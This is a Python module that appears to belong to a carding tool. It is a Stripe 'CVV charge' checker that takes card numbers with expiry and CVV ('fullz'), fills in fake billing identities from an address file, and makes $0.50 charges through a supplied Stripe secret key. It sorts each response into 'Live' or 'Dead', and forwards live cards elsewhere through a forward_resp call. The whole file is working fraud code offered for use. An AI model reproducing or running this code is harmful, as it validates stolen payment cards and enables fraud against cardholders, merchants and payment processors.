import random
import uuid
from fake_useragent import UserAgent
from FUNC.defs import *



async def create_payment_intent(session,sk):
    while  True:
        order_id = random.randint(1000,9999)
        try:
            url = "https://api.stripe.com/v1/payment_intents"
            header = {
                "Authorization": f"Bearer {sk}",
            }
            data = f"amount=50&currency=usd&payment_method_types[]=card&use_stripe_sdk=true&metadata[order_id]={order_id}"
            result = await session.post(url=url , headers=header , data=data)
            if "rate_limit" in result.text:
                # print("rate limit")
                continue
            else:
                break
        except Exception as e:
            print(e)
            continue
    try:
        id = result.json()["id"]
        client_secret = result.json()["client_secret"]
        return id , client_secret
    except:
        return result.text
    

async def cvv_confirm_intent(session,fullz,id,client_secret,pk,all_data):
    cc , mes , ano , cvv = fullz.split("|")
    data = random.choice(all_data)
    fname = data["first_name"]
    lname = data["last_name"]
    email = data["email"]
    zip = data["zip"]
    add1 = data["add1"]
    add2 = data["add2"]
    city = data["city"]
    state = data["state"]
    country = data["country"]
    name = fname + " " + lname
    phone = str(random.randint(220,820)) + str(random.randint(100,999)) +   str(random.randint(1000,9999))
    order_id = random.randint(1000,9999)
    while  True:
        try:
            url = f"https://api.stripe.com/v1/payment_intents/{id}/confirm"
            data = f"""payment_method_data[type]=card&payment_method_data[card][number]={cc}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[card][cvc]={cvv}&payment_method_data[billing_details][name]={name}&payment_method_data[billing_details][phone]={phone}&payment_method_data[billing_details][email]={email}&payment_method_data[billing_details][address][line1]={add1}&payment_method_data[billing_details][address][line2]={add2}&payment_method_data[billing_details][address][city]={city}&payment_method_data[billing_details][address][state]={state}&payment_method_data[billing_details][address][postal_code]={zip}&payment_method_data[billing_details][address][country]=US&payment_method_data[time_on_page]={random.randint(10,20)}&expected_payment_method_type=card&use_stripe_sdk=true&key={pk}&_stripe_version=2022-11-15&client_secret={client_secret}"""
            result = await session.post(url=url , data=data)
            if "rate_limit" in result.text:
                continue
            else:
                break
        except Exception as e:
            return e
    return result.text

#await forward_resp(fullz, "Stripe CVV Charge 0.5$ SK Based", response)

async def charge_resp(result,fullz,gate):
# async def charge_resp(fullcc,result,gate):
    try:
        # print(result)
        if '"seller_message": "Payment complete."' in result or "succeeded" in result:
            status = "Live 🟢"
            response = "Approved"
            hits     = "YES"
            await forward_resp(fullz, "Stripe CVV Charge 0.5$ SK Based", response)
         
        elif "insufficient_funds" in result or "card has insufficient funds." in result:
            status = "Live 🟢"
            response = "Insufficient Funds ❎"
            hits     = "YES"
            await forward_resp(fullz, "Stripe CVV Charge 0.5$ SK Based", response)
            

        elif "incorrect_cvc" in result or "security code is incorrect." in result or "Your card's security code is incorrect." in result  :
            status = "Live 🟡"
            response = "CCN Live ❎"
            hits     = "YES"
            await forward_resp(fullz, "Stripe CVV Charge 0.5$ SK Based", response)
           
            

        elif "transaction_not_allowed" in result:
            status = "Live 🟡"
            response = "Card Doesn't Support Purchase ❎"
            hits     = "YES"
            await forward_resp(fullz, "Stripe CVV Charge 0.5$ SK Based", response)
            
            

        elif '"cvc_check": "pass"' in result:
            status = "Live 🟢"
            response = "CVV LIVE ❎"
            hits     = "YES"
            await forward_resp(fullz, "Stripe CVV Charge 0.5$ SK Based", response)
            
            
        elif "incorrect_zip" in result:
            status = "Dead 🔴"
            response = "Incorrect Zip 🚫"
            hits     = "NO"

        elif "three_d_secure_redirect" in result or "card_error_authentication_required" in result:
            status = "Live 🟡"
            response = "3D Secure Redirected ❎"
            hits     = "YES"
            await forward_resp(fullz, "Stripe CVV Charge 0.5$ SK Based", response)

            

        elif "stripe_3ds2_fingerprint" in result:
            status = "Live 🟡"
            response = "3D Secured ❎"
            hits     = "YES"
            await forward_resp(fullz, "Stripe CVV Charge 0.5$ SK Based", response)
            

        elif "Your card does not support this type of purchase." in result:
            status = "Live 🟡"
            response = "Card Doesn't Support Purchase ❎"
            hits     = "YES"
            await forward_resp(fullz, "Stripe CVV Charge 0.5$ SK Based", response)
            
            

        elif "generic_decline" in result or "You have exceeded the maximum number of declines on this card in the last 24 hour period." in result or "card_decline_rate_limit_exceeded" in result:
            status = "Dead 🔴"
            response = "Generic Decline 🚫"
            hits = "NO"

        elif "do_not_honor" in result:
            status = "Dead 🔴"
            response = "Do Not Honor 🚫"
            hits = "NO"

        elif "fraudulent" in result:
            status = "Dead 🔴"
            response = "Fraudulent 🚫"
            hits = "NO"

        elif "stolen_card" in result:
            status = "Dead 🔴"
            response = "Stolen Card 🚫"
            hits = "NO"

        elif "lost_card" in result:
            status = "Dead 🔴"
            response = "Lost Card 🚫"
            hits = "NO"

        elif "pickup_card" in result:
            status = "Dead 🔴"
            response = "Pickup Card 🚫"
            hits = "NO"

        elif "incorrect_number" in result:
            status = "Dead 🔴"
            response = "Incorrect Card Number 🚫"
            hits = "NO"

        elif "Your card has expired." in result or "expired_card" in result:
            status = "Dead 🔴"
            response = "Expired Card 🚫"
            hits = "NO"

        elif "intent_confirmation_challenge" in result:
            status = "Dead 🔴"
            response = "Captcha 😥"
            hits = "NO"

        elif "Your card number is incorrect." in result:
            status = "Dead 🔴"
            response = "Incorrect Card Number 🚫"
            hits = "NO"

        elif "Your card's expiration year is invalid." in result or "Your card\'s expiration year is invalid." in result:
            status = "Dead 🔴"
            response = "Expiration Year Invalid 🚫"
            hits = "NO"

        elif "Your card's expiration month is invalid." in result or "invalid_expiry_month" in result:
            status = "Dead 🔴"
            response = "Expiration Month Invalid 🚫"
            hits = "NO"

        elif "card is not supported." in result:
            status = "Dead 🔴"
            response = "Card Not Supported 🚫"
            hits = "NO"

        elif "invalid_account" in result:
            status = "Dead 🔴"
            response = "Dead Card 🚫"
            hits = "NO"

        elif "Invalid API Key provided" in result or "testmode_charges_only" in result or "api_key_expired" in result or "Your account cannot currently make live charges." in result:
            status = "Dead 🔴"
            response = "stripe error . contact support@stripe.com for more details 🚫"
            hits = "NO"
            

        elif "Your card was declined." in result or "card was declined" in result:
            status = "Dead 🔴"
            response = "Generic Decline 🚫"
            hits = "NO"

        else:
            status = "Dead 🔴"
            response = f"Card Declined 🚫"
            hits = "NO"
    except:
        status = "Dead 🔴"
        response = f"Card Declined 🚫"
        hits = "NO"

    json = {
            "status": status,
            "response": response,
            "hits": hits,
            "fullz": fullz,
        }

    return json
 

import json

async def skcvv_basedCode(sk,pk,fullz,session):
    all_data = json.loads(open("FILES/address.json", "r").read())
    id , client_secret= await create_payment_intent(session ,sk)
    confirm = await cvv_confirm_intent(session,fullz,id,client_secret,pk,all_data)
    getresp = await charge_resp(confirm,fullz,"Stripe CVV Charge 1$")
   
    return getresp





